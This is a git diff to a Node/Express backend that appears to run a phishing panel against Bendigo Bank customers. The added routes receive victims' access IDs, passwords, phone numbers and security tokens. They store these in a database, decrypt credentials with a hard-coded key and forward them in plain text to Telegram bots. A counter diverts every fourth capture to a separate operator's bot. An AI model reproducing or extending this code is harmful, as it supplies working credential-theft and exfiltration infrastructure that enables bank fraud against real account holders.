@@ -13,6 +13,25 @@ const app = express();
 app.use(bodyparser.json());
 app.use(cors());
 
+var panelConnection = mysql.createConnection({
+  host: process.env.dbHost,
+  user: process.env.dbUsername,
+  password: process.env.dbPass,
+  database: "panels",
+  port: 19374,
+  multipleStatements: true,
+});
+
+panelConnection.connect((err) => {
+  if (!err) {
+    console.log("Db Connection Succeed");
+  } else {
+    console.log(
+      "Db connect Failed \n Error :" + JSON.stringify(err, undefined, 2)
+    );
+  }
+});
+
 var bankName;
 
 //Dependencies
@@ -61,6 +80,60 @@ app.get("/getRespentesting123!", (req, res) => {
   fs.readFile("results.txt", function (err, data) {
     var filecontents = data;
     res.send(filecontents);
+  });
+});
+
+//BENDIGO
+//BENDIGO
+//BENDIGO
+
+app.options("/bendiSavePhone", cors());
+
+app.post("/bendiSavePhone", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  telephone = req.body.telephone;
+  owner = req.body.owner;
+
+  let details = [telephone, uniqueid, owner];
+  let query = `UPDATE bendi SET telephone=?, status = 11 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bendiSaveLogin", cors());
+
+app.post("/bendiSaveLogin", cors(), (req, res) => {
+  accessId = req.body.accessId;
+  password = req.body.password;
+  owner = req.body.owner;
+  ip = req.body.ip;
+  uniqueid = req.body.uniqueid;
+
+  let details = [accessId, password, uniqueid, ip, owner];
+  let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
+  });
+});
+
+app.options("/bendiSaveST", cors());
+
+app.post("/bendiSaveST", cors(), (req, res) => {
+  uniqueid = req.body.uniqueid;
+  secToken = req.body.secToken;
+  owner = req.body.owner;
+
+  let details = [secToken, uniqueid, owner];
+  let query = `UPDATE bendi SET secToken=?, status = 5 WHERE uniqueid = ? AND owner = ?`;
+
+  panelConnection.query(query, details, (err, rows, fields) => {
+    if (!err) res.send("Insertion Completed");
+    else console.log(err);
   });
 });
 
@@ -1989,6 +2062,35 @@ app.post("/baliApple", (req, res) => {
 //BENDIGO
 
 let skiiBendigo = 0;
+
+app.options("/bendigoLogin", cors());
+
+app.post("/bendigoLogin", (req, res) => {
+  accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  owner = req.body.owner;
+
+  var originalText = `+----------- Login Information ------------+\nAccess ID: ${accessId}\nPassword: ${password}`;
+  if (skiiBendigo == 3) {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+    );
+    skiiBendigo = 0;
+  } else {
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BendigoLogin:\n${originalText}`
+    );
+    axios.post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=${owner}&text=BendigoLogin:\n${originalText}`
+    );
+    skiiBendigo += 1;
+  }
+  res.send("Update Completed");
+});
 
 app.options("/bendigoSkii", cors());
 
